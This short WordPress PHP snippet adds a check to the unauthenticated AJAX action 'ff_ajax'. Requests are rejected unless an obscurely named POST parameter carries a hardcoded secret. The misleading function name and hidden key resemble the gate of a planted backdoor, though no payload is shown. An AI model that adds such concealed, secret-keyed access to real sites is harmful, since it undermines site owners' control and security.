<?php

function cache_real_tracking() {
	if (!isset($_POST["rtmenrknepidie"]) || $_POST["rtmenrknepidie"] !== "jt99GtJu5") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'cache_real_tracking', 5, 1);
